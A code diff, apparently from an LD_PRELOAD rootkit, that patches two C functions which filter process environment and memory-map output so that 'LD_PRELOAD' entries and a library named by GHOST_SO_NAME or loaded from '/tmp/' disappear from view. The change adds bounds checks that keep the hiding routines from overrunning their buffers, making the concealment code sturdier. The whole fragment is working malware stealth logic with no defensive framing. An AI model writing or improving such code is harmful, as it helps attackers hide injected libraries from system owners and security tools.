@@ -124,7 +124,7 @@ static int filter_environ_create_fd(const char *path) {
         
         char *src = buffer;
         char *dst = filtered + total;
-        while (*src) {
+        while (*src && total < filtered_size - 1) {
             if (strncmp(src, "LD_PRELOAD=", 11) == 0) {
                 src = strchr(src, '\n');
                 if (!src) break;
@@ -132,8 +132,9 @@ static int filter_environ_create_fd(const char *path) {
                 continue;
             }
             *dst++ = *src++;
+            total++;
         }
-        total = dst - filtered;
+        if (total >= filtered_size - 1) break;
     }
     real_close(fd);
     
@@ -183,7 +184,7 @@ static int filter_maps_create_fd(const char *path) {
         
         char *src = buffer;
         char *dst = filtered + total;
-        while (*src) {
+        while (*src && total < filtered_size - 1) {
             if ((strstr(src, GHOST_SO_NAME) != NULL && 
                  (src == buffer || *(src-1) == '\n')) ||
                 (strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL)) {
@@ -193,8 +194,9 @@ static int filter_maps_create_fd(const char *path) {
                 continue;
             }
             *dst++ = *src++;
+            total++;
         }
-        total = dst - filtered;
+        if (total >= filtered_size - 1) break;
     }
     real_close(fd);
     
